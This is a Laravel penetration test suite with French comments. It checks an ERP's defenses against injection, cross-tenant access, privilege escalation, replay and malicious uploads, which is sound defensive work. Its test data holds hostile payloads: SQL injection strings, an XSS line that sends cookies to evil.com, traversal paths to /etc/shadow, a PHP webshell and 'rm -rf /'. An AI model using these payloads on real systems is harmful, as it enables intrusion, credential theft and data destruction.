<?php

namespace Tests\Security;

use App\Models\Event;
use App\Models\Organization;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * PenetrationTest — Tests simulant des attaques réelles sur SECRETIS ERP
 *
 * Ces tests vérifient que les protections de sécurité fonctionnent
 * même face à des requêtes malveillantes délibérées.
 *
 * Exécution : php artisan test --testsuite=Security --stop-on-failure
 *
 * IMPORTANT : Ces tests doivent TOUS PASSER avant tout déploiement en production.
 * Tout échec = vulnérabilité confirmée = blocage du déploiement.
 *
 * Catégories de tests :
 *  A. Injection (SQL, XSS, Path Traversal)
 *  B. Autorisation (IDOR, Cross-Tenant, Privilege Escalation)
 *  C. Authentification (Rate Limiting, Mass Assignment)
 *  D. Paiements (Webhook Replay)
 *  E. Fichiers (Upload malveillant)
 */
class PenetrationTest extends TestCase
{
    use RefreshDatabase;

    private Organization $orgA;
    private Organization $orgB;
    private User $userA;
    private User $userB;
    private User $adminA;

    protected function setUp(): void
    {
        parent::setUp();

        // Organisation A — attaquant
        $this->orgA = Organization::factory()->create(['status' => 'active']);

        // Organisation B — victime
        $this->orgB = Organization::factory()->create(['status' => 'active']);

        // Utilisateur normal org A (attaquant)
        $this->userA = User::factory()->create([
            'organization_id' => $this->orgA->id,
            'status'          => 'active',
        ]);
        $this->userA->assignRole('user');

        // Utilisateur normal org B (victime)
        $this->userB = User::factory()->create([
            'organization_id' => $this->orgB->id,
            'status'          => 'active',
        ]);

        // Admin org A
        $this->adminA = User::factory()->create([
            'organization_id' => $this->orgA->id,
            'status'          => 'active',
        ]);
        $this->adminA->assignRole('admin_org');
    }

    // =========================================================================
    // A. INJECTION
    // =========================================================================

    /**
     * Test A1 : Injection SQL dans les paramètres de recherche.
     *
     * L'ORM Eloquent utilise des requêtes paramétrées par défaut.
     * Une tentative d'injection SQL doit retourner 0 résultats,
     * pas une erreur SQL 500 qui confirmerait la vulnérabilité.
     */
    public function test_sql_injection_in_search_params(): void
    {
        $this->actingAs($this->userA);

        $payloads = [
            "' OR '1'='1",
            "'; DROP TABLE events; --",
            "' UNION SELECT * FROM users --",
            "1; SELECT sleep(5); --",
            "' OR 1=1 LIMIT 1 --",
            "%' AND 0=1 UNION SELECT user(),version(),3 --",
        ];

        foreach ($payloads as $payload) {
            $response = $this->getJson("/api/events?search=" . urlencode($payload));

            // Ne doit PAS retourner 500 (erreur SQL)
            $this->assertNotEquals(500, $response->status(),
                "SQL injection possible avec le payload: {$payload}");

            // Ne doit PAS retourner de données SQL brutes
            $content = $response->getContent();
            $this->assertStringNotContainsString('syntax error', strtolower($content));
            $this->assertStringNotContainsString('mysql', strtolower($content));
            $this->assertStringNotContainsString('pgsql', strtolower($content));
            $this->assertStringNotContainsString('sqlite', strtolower($content));
        }
    }

    /**
     * Test A2 : XSS dans le titre d'un événement.
     *
     * Les données stockées doivent être sauvegardées telles quelles (persistance)
     * mais restituées encodées (protection XSS) lors de l'affichage.
     * L'API doit retourner le texte brut HTML-encodé, pas le script exécutable.
     */
    public function test_xss_in_event_title(): void
    {
        $this->actingAs($this->userA);

        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(document.cookie)',
            '<svg onload=alert(1)>',
            '"><script>fetch("https://evil.com?c="+document.cookie)</script>',
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->postJson('/api/events', [
                'title'            => $payload,
                'starts_at'        => now()->addHour()->toIso8601String(),
                'ends_at'          => now()->addHours(2)->toIso8601String(),
                'calendar_id'      => 1,
                'organization_id'  => $this->orgA->id,
            ]);

            if ($response->status() === 201) {
                $eventId  = $response->json('data.id');
                $getResp  = $this->getJson("/api/events/{$eventId}");
                $title    = $getResp->json('data.title');

                // Le titre doit être présent (il est stocké)
                $this->assertNotNull($title);

                // Mais les balises script ne doivent pas être exécutables
                // (en JSON, < et > sont encodés en < et > par défaut)
                $rawContent = $getResp->getContent();
                $this->assertStringNotContainsString('<script>', $rawContent,
                    "XSS non protégé avec : {$payload}");
                $this->assertStringNotContainsString('onerror=', $rawContent,
                    "XSS event handler non filtré : {$payload}");
            }
        }
    }

    /**
     * Test A3 : Path traversal dans les téléchargements de fichiers.
     *
     * Un attaquant tente d'accéder à des fichiers hors du répertoire prévu.
     * Les chemins avec ../ doivent être rejetés ou normalisés.
     */
    public function test_path_traversal_in_file_download(): void
    {
        $this->actingAs($this->userA);

        $traversalPayloads = [
            '../../etc/passwd',
            '../../../etc/shadow',
            '..%2F..%2Fetc%2Fpasswd',
            '....//....//etc/passwd',
            '%2e%2e%2fetc%2fpasswd',
            '..\\..\\windows\\system32\\drivers\\etc\\hosts',
        ];

        foreach ($traversalPayloads as $payload) {
            $response = $this->get('/api/documents/download/' . $payload);

            // Doit retourner 404 ou 400, jamais 200 avec le contenu d'un fichier système
            $this->assertContains($response->status(), [400, 404, 403, 422],
                "Path traversal possible avec : {$payload}");

            // Le contenu de /etc/passwd ne doit pas être dans la réponse
            $this->assertStringNotContainsString('root:x:', $response->getContent());
        }
    }

    // =========================================================================
    // B. AUTORISATION
    // =========================================================================

    /**
     * Test B1 : IDOR — Accès aux ressources d'une autre organisation.
     *
     * L'utilisateur A tente d'accéder à un événement de l'organisation B
     * en devinant son ID. Doit retourner 403 ou 404.
     */
    public function test_idor_on_organization_resources(): void
    {
        // Créer un événement dans l'org B (victime)
        $victimEvent = Event::factory()->create([
            'organization_id' => $this->orgB->id,
            'title'           => 'SECRET_EVENT_ORG_B',
        ]);

        // L'attaquant (org A) tente d'accéder à l'événement de l'org B
        $this->actingAs($this->userA);

        $response = $this->getJson("/api/events/{$victimEvent->id}");

        // Doit être refusé
        $this->assertContains($response->status(), [403, 404],
            "IDOR possible : l'utilisateur A peut voir les événements de l'org B");

        // Le titre secret ne doit pas apparaître dans la réponse
        $this->assertStringNotContainsString('SECRET_EVENT_ORG_B', $response->getContent());
    }

    /**
     * Test B2 : Escalade de privilèges via API.
     *
     * Un utilisateur normal ne doit pas pouvoir se promouvoir
     * en administrateur via l'API (ex: PATCH /api/users/me).
     */
    public function test_privilege_escalation_via_api(): void
    {
        $this->actingAs($this->userA);

        $escalationPayloads = [
            // Tentative de modification du rôle via le profil
            ['role'          => 'superadmin_ibig'],
            ['role'          => 'admin_org'],
            ['roles'         => ['superadmin_ibig']],
            // Tentative de se rendre super admin
            ['is_super_admin' => true],
            ['is_admin'       => true],
            // Tentative de changer d'organisation
            ['organization_id' => $this->orgB->id],
        ];

        foreach ($escalationPayloads as $payload) {
            $response = $this->patchJson("/api/users/{$this->userA->id}", $payload);

            // Soit refusé (403/422), soit les champs ignorés (200 mais sans changement)
            if ($response->status() === 200) {
                // Vérifier que le rôle n'a pas changé
                $this->userA->refresh();
                $this->assertFalse($this->userA->hasRole('superadmin_ibig'),
                    "Escalade de privilège possible via PATCH /api/users");
                $this->assertFalse($this->userA->hasRole('admin_org'),
                    "Escalade de privilège possible via PATCH /api/users");
                $this->assertEquals($this->orgA->id, $this->userA->organization_id,
                    "Changement d'organisation possible via PATCH /api/users");
            }
        }
    }

    // =========================================================================
    // C. AUTHENTIFICATION
    // =========================================================================

    /**
     * Test C1 : Rate limiting sur la page de login.
     *
     * Après 5 tentatives échouées, la 6ème doit être bloquée (429).
     */
    public function test_rate_limit_login(): void
    {
        // Réinitialiser le rate limiter pour ce test
        RateLimiter::clear('login:attacker@test.com|127.0.0.1');

        // 5 tentatives échouées
        for ($i = 1; $i <= 5; $i++) {
            $this->postJson('/auth/login', [
                'email'    => 'attacker@test.com',
                'password' => 'wrongpassword_' . $i,
            ]);
        }

        // La 6ème doit être bloquée
        $response = $this->postJson('/auth/login', [
            'email'    => 'attacker@test.com',
            'password' => 'wrongpassword_6',
        ]);

        $this->assertEquals(429, $response->status(),
            "Le rate limiting n'est pas actif sur le login (6ème tentative non bloquée)");
    }

    /**
     * Test C2 : Mass assignment — Champs sensibles non modifiables via API.
     *
     * Les champs comme is_super_admin, organization_id, password (hash direct),
     * failed_login_attempts ne doivent pas être modifiables via les formulaires.
     */
    public function test_mass_assignment(): void
    {
        $this->actingAs($this->userA);

        $sensitiveFields = [
            'is_super_admin'         => true,
            'organization_id'        => $this->orgB->id,
            'failed_login_attempts'  => 0,
            'locked_until'           => null,
            'email_verified_at'      => null,
            'remember_token'         => 'hacked_token',
        ];

        $response = $this->patchJson("/api/users/{$this->userA->id}", array_merge(
            ['name' => 'Legitimate Name Change'],
            $sensitiveFields
        ));

        if ($response->successful()) {
            $this->userA->refresh();

            // Vérifier que les champs sensibles n'ont pas changé
            $this->assertEquals($this->orgA->id, $this->userA->organization_id,
                "Mass assignment : organization_id modifiable");

            $this->assertFalse((bool) $this->userA->getAttribute('is_super_admin'),
                "Mass assignment : is_super_admin modifiable");
        }
    }

    // =========================================================================
    // D. PAIEMENTS
    // =========================================================================

    /**
     * Test D1 : Idempotence des webhooks de paiement.
     *
     * Le même webhook envoyé deux fois ne doit activer la licence qu'une seule fois.
     * Protection contre les attaques de replay et les doublons de fournisseur.
     */
    public function test_webhook_replay_attack(): void
    {
        // Construire un payload de webhook valide
        $paymentId = 'pay_test_' . uniqid();
        $payload   = [
            'event'      => 'payment.succeeded',
            'payment_id' => $paymentId,
            'amount'     => 5000,
            'currency'   => 'XOF',
            'metadata'   => [
                'organization_id' => $this->orgA->id,
                'plan_id'         => 1,
                'duration_months' => 1,
            ],
        ];

        $signature = hash_hmac('sha256', json_encode($payload), config('services.stripe.webhook_secret', 'test_secret'));

        // Premier appel — doit créer la licence
        $response1 = $this->postJson('/webhooks/payment', $payload, [
            'X-Webhook-Signature' => $signature,
        ]);

        // Deuxième appel identique (replay) — doit être idempotent
        $response2 = $this->postJson('/webhooks/payment', $payload, [
            'X-Webhook-Signature' => $signature,
        ]);

        // Les deux doivent retourner 200 (idempotence, pas d'erreur)
        // Mais la licence ne doit être créée qu'une seule fois
        $this->orgA->refresh();

        $licenseCount = \App\Models\License::where('organization_id', $this->orgA->id)
            ->where('status', 'active')
            ->count();

        $this->assertLessThanOrEqual(1, $licenseCount,
            "Replay attack possible : la licence a été activée plusieurs fois pour le même paiement");
    }

    // =========================================================================
    // E. FICHIERS
    // =========================================================================

    /**
     * Test E1 : Upload d'un fichier PHP déguisé en image.
     *
     * Un fichier PHP malveillant renommé en .jpg doit être rejeté
     * grâce à la vérification du MIME réel et des magic bytes.
     */
    public function test_file_upload_malicious_content(): void
    {
        Storage::fake('private');
        $this->actingAs($this->userA);

        $maliciousFiles = [
            // PHP webshell renommé en .jpg
            UploadedFile::fake()->createWithContent(
                'photo.jpg',
                '<?php system($_GET["cmd"]); ?>'
            ),
            // PHP renommé en .png avec extension double
            UploadedFile::fake()->createWithContent(
                'image.php.png',
                '<?php phpinfo(); ?>'
            ),
            // Shell script renommé en PDF
            UploadedFile::fake()->createWithContent(
                'document.pdf',
                '#!/bin/bash\nrm -rf /'
            ),
            // Fichier HTML/JS renommé en image
            UploadedFile::fake()->createWithContent(
                'avatar.gif',
                '<script>alert(document.cookie)</script>'
            ),
        ];

        foreach ($maliciousFiles as $file) {
            $response = $this->postJson('/api/documents', [
                'file'            => $file,
                'folder_id'       => 1,
                'organization_id' => $this->orgA->id,
            ]);

            // Doit être rejeté
            $this->assertContains($response->status(), [400, 422, 415],
                "Fichier malveillant accepté : {$file->getClientOriginalName()}");
        }

        // Vérifier qu'aucun fichier PHP n'a été stocké
        Storage::disk('private')->assertDirectoryEmpty(
            "organizations/{$this->orgA->id}/documents"
        );
    }

    // =========================================================================
    // TESTS SUPPLÉMENTAIRES
    // =========================================================================

    /**
     * Test F1 : Les endpoints API n'exposent pas de stack traces en production.
     *
     * Simuler une erreur interne et vérifier que la réponse ne contient
     * pas de chemin de fichier, nom de classe, ou trace PHP.
     */
    public function test_no_stack_trace_in_api_error_response(): void
    {
        // Simuler APP_DEBUG=false
        config(['app.debug' => false]);
        config(['app.env' => 'production']);

        $this->actingAs($this->userA);

        // Appel à un endpoint qui génère une erreur interne
        // (ex: ID inexistant qui provoque une exception)
        $response = $this->getJson('/api/events/999999999');

        // La réponse ne doit pas contenir de stack trace PHP
        $content = $response->getContent();
        $this->assertStringNotContainsString('/var/www/', $content,
            "Chemin serveur exposé dans la réponse d'erreur");
        $this->assertStringNotContainsString('app/Http/', $content,
            "Chemin de code source exposé");
        $this->assertStringNotContainsString('#0 ', $content,
            "Stack trace exposée dans la réponse d'erreur");
        $this->assertStringNotContainsString('Exception', $content,
            "Nom de classe d'exception exposé");
    }

    /**
     * Test F2 : CSRF — Les requêtes POST sans token CSRF sont rejetées.
     */
    public function test_csrf_protection_on_state_changing_requests(): void
    {
        // Désactiver VerifyCsrfToken pour ce test spécifique serait incorrect —
        // ce test vérifie que le middleware EST actif.

        $this->actingAs($this->userA);

        // Requête sans token CSRF (simuler une requête cross-site)
        $response = $this->withoutCookie('XSRF-TOKEN')
            ->post('/api/events', [
                'title'       => 'Test',
                'starts_at'   => now()->toIso8601String(),
                'ends_at'     => now()->addHour()->toIso8601String(),
                'calendar_id' => 1,
            ], ['Accept' => 'text/html']); // Pas de Accept: application/json

        // Pour les requêtes web (non-JSON), doit retourner 419 (CSRF token mismatch)
        // Pour les requêtes API avec Sanctum, le CSRF est géré différemment
        $this->assertNotEquals(200, $response->status());
    }

    /**
     * Test F3 : Headers de sécurité présents sur toutes les réponses.
     */
    public function test_security_headers_present(): void
    {
        $this->actingAs($this->userA);

        $response = $this->getJson('/api/events');

        $response->assertHeader('X-Frame-Options', 'DENY');
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

        // CSP doit être présent
        $this->assertNotNull($response->headers->get('Content-Security-Policy'),
            "Content-Security-Policy header manquant");
    }

    /**
     * Test F4 : Énumération d'utilisateurs via forgotPassword — réponse identique.
     *
     * L'endpoint "mot de passe oublié" doit retourner le même message
     * qu'un email existe ou non dans la base.
     */
    public function test_no_user_enumeration_via_forgot_password(): void
    {
        // Email inexistant
        $response1 = $this->postJson('/auth/forgot-password', [
            'email' => 'definitely_not_existing@example.com',
        ]);

        // Email existant
        $response2 = $this->postJson('/auth/forgot-password', [
            'email' => $this->userA->email,
        ]);

        // Les deux réponses doivent avoir le même statut et le même message
        $this->assertEquals($response1->status(), $response2->status(),
            "Énumération d'utilisateurs possible via le statut HTTP de forgotPassword");

        $this->assertEquals(
            $response1->json('message'),
            $response2->json('message'),
            "Énumération d'utilisateurs possible via le message de forgotPassword"
        );
    }
}
